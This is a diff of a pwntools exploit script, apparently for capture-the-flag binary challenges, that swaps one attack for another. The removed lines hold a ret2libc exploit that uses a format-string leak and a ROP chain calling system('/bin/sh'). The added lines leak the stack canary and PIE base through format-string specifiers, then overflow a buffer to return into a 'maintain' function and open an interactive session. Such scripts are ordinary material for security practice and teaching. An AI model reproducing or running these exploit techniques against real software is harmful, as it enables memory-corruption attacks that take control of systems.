@@ -122,18 +122,7 @@ exe = context.binary = ELF(args.EXE or 'main')
 # for all created processes...
 # ./exploit.py DEBUG NOASLR
 
-# Use the specified remote libc version unless explicitly told to use the
-# local system version with the `LOCAL_LIBC` argument.
-# ./exploit.py LOCAL LOCAL_LIBC
-if args.LOCAL_LIBC:
-    libc = exe.libc
-else:
-    library_path = libcdb.download_libraries('libc.so.6')
-    if library_path:
-        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
-        libc = exe.libc
-    else:
-        libc = ELF('libc.so.6')
+
 
 def start(argv=[], *a, **kw):
     '''Start the exploit against the target.'''
@@ -155,69 +144,45 @@ continue
 #===========================================================
 # Arch:     amd64-64-little
 # RELRO:      Full RELRO
-# Stack:      No canary found
+# Stack:      Canary found
 # NX:         NX enabled
 # PIE:        PIE enabled
-# RUNPATH:    b'.'
 # Stripped:   No
 
 io = start()
 
-def menu(ch):
-    io.recvuntil(b'> ')
-    io.sendline(str(ch).encode())
 
-for i in range(4):
-    menu(1)
-    io.recvuntil(b"Enter file name: ")
-    io.sendline(b"%33$p.")
-    io.recvuntil(b"Enter file contents: ")
-    io.sendline(b"%33$p.")
+io.sendlineafter(b'? ', b's')
+io.sendlineafter(b'filename to print: ', b'%39$p %107$p')
+io.sendlineafter(b'Enter URL: ', b'URL')
 
-menu(2)
-io.recvuntil(b"Enter file index: ")
-io.sendline(b"3")
-io.recvuntil(b"Filename: ")
-io.recvline()
-io.recvuntil(b"Contents: ")
-
-
-data = io.recvline().strip()
-log.info(data)
-leak_vals = data.split(b'.')[0].split()
+data = io.recvline_contains(b'Confirm printing:').strip()
+leak_vals = data.split(b' from ')[0].split()
 log.info(f"raw leaks: {leak_vals}")
-leak = int(leak_vals[0], 16)
-log.success(f"Leaked pointer libc: {hex(leak)}")
 
-LIBC_BASE = leak - 0x27769
-SYSTEM    = LIBC_BASE + libc.symbols['system']
-BINSH     = LIBC_BASE + next(libc.search(b"/bin/sh"))
+canary = int(leak_vals[2], 16)
+main = int(leak_vals[3], 16)
+log.success(f"canary = {hex(canary)}")
+log.success(f"main = {hex(main)}")
+
+exe.address = main - exe.sym['main']
+log.success(f"PIE base = {hex(exe.address)}")
+
+maintain = exe.symbols['maintain']
+log.success(f"maintain() = {hex(maintain)}")
+
+rop = ROP(exe)
+ret = rop.find_gadget(['ret'])[0]
 
 
-log.info(f"libc base = {hex(LIBC_BASE)}")
-log.info(f"system()  = {hex(SYSTEM)}")
-log.info(f"/bin/sh   = {hex(BINSH)}")
-
-rop = ROP(libc)
-pop_rdi = LIBC_BASE + rop.find_gadget(['pop rdi', 'ret'])[0]
-ret = LIBC_BASE + rop.find_gadget(['ret'])[0]
-binsh = LIBC_BASE + next(libc.search(b'/bin/sh'))
-
-offset = 12
-
-payload = flat(
-    b'A' * offset,
-    p64(pop_rdi),
-    p64(binsh),
+io.sendlineafter(b'Enter credentials: ', flat(
+    b'A'*264,
+    p64(canary),
     p64(ret),
-    p64(SYSTEM)
-)
+    p64(ret),
+    p64(maintain)
+))
 
-menu(3)
-io.recvuntil(b"Enter file index: ")
-io.sendline(b"0")
-io.recvuntil(b"Enter new content: ")
-io.sendline(payload)
 
 io.interactive()
 
